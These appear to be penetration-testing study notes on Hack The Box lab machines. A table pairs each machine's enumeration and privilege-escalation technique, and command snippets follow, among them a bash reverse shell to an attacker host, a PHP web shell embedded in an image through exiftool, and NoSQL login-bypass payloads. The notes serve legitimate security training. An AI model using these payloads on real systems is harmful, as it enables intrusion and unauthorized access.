### Machines

| Machine | Enumeration | Privilege Escalation |
| ------------- | ------------- | ------------- |
| Forlic | playsms Ook! | BOF |
| Admirer | Adminer MySQL(local) | Hijacking Python Library | 
| Armageddon | Drupal (2018-7600) | binary snap |
| Backdoor | wordpress LFI proc gdbserver | screen |
| Blocky | dirb javadecompilers wordpress | sudo list |
| Blunder | feroxbuster Extensions [txt] bludit | sudo versions before 1.8.28 |
| Brainfuck | wordpress plugin smtp pop3 | Cryptography |
| Cronos | subdomain wfuzz| crontab |
| Doctor | [ssti-payloads](https://github.com/payloadbox/ssti-payloads) | Splunk |
| Forge | SSRF subdomain ftp | sudo list Python Debugger pdb |
| Haircut | dirb medium.txt writeable uploads folder | Unknown SUID binary screen |
| Horizontall | wfuzz top1million-110000 strapi | active port 8000 ```local CVE``` ssh tunnel |
| Irked | irc-unrealircd-backdoor | LinPEAS Unknown SUID binary |
| *Jarvis | SQLi phpmyadmin 4.8 RCE | python command injection & systemctl binary |
| Knife | firefox wappalyzer [PHP 8.1.0](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)| upgrade shell & sudo list |
| Lame | distccd | nmap |
| *Luanne | nmap Supervisor & robots.txt weather | BSD doas & netpgp backup file |
| Magic | [SQLi](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/) bypassing login & <br> File upload bypass [PHP getimagesize()](https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass) | mysqldump & Unknown SUID binary sysinfo |
| Mango |  [enumerate](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration) credentials of nosql-injection <br> (*Not sure if you can use this script in the exam), reuse | jjs, write root SSH public key | 

### Additional command notes

Used in ```Knife``` for upgrade shell

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'
```

Used in ```Luanne``` 

authenticate

```
curl -s http://127.0.0.1:3001/<folder>/ -u <user>:<password>
```

Find the open port

```
netstat -punta || ss -nltpu || netstat -anv
```

Used in ```Magic``` 

image file upload bypass

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
```

dump mysql database data without using mysql client tool

```
mysqldump -u root -p database_name > database_name.sql
```

Used in ```Mango```

[nosql-injection](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/nosql-injection.md): basic authentication bypass

```
# change post data
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```